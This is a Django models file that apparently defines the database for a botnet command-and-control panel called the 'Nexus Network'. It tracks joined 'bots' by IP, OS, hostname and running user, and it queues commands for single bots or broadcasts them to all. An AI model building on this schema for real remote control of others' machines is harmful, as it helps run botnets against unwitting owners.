from django.contrib.auth.models import User
from django.db import models

# This Bot class initiates the first ever join.
class Bot(models.Model):
    ip_address = models.CharField(max_length=46) # In case of IPv6, 45 characters needed
    os = models.CharField(max_length=15, blank=True) # OS(Operating System)
    hostname = models.CharField(max_length=65, blank=True)
    user = models.CharField(max_length=165, blank=True) # User of the machine(Like which user were running the process that led the device here)
    date_of_join = models.DateTimeField(auto_now_add=True, editable=False)
    room_id = models.CharField(max_length=150)
    is_online = models.BooleanField(default=True)
    is_being_used = models.BooleanField(default=True)
    id = models.AutoField(primary_key=True)
# Every time the bot rejoins the Nexus Network, it will create a new object from this class
class RegisterJoin(models.Model):
    ip_address = models.CharField(max_length=46)
    os = models.CharField(max_length=15, blank=True)
    hostname = models.CharField(max_length=65, blank=True)
    user = models.CharField(max_length=165, blank=True)
    date_of_join = models.DateTimeField(auto_now_add=True, editable=False)
class UserClass(models.Model):
    user = models.ForeignKey(User, on_delete=models.CASCADE, related_name='profile')
    api_key = models.CharField(max_length=100, blank=False)
    # is_submitted = models.BooleanField(default=False) """ Is active has been created in User class """
class Request(models.Model):
    user = models.ForeignKey(User, on_delete=models.CASCADE, related_name='request')
    cmd = models.TextField()
    target = models.ForeignKey(Bot, on_delete=models.CASCADE)
    date_of_request = models.DateTimeField(auto_now_add=True, editable=False)
class Broadcast(models.Model):
    user = models.ForeignKey(User, on_delete=models.CASCADE)
    cmd = models.TextField()
    date_of_broadcast = models.DateTimeField(auto_now_add=True, editable=False)
class Settings(models.Model):
    broadcast_enabled = models.BooleanField(default=True)
    api_usage_enabled = models.BooleanField(default=True)
    registration_enabled = models.BooleanField(default=True)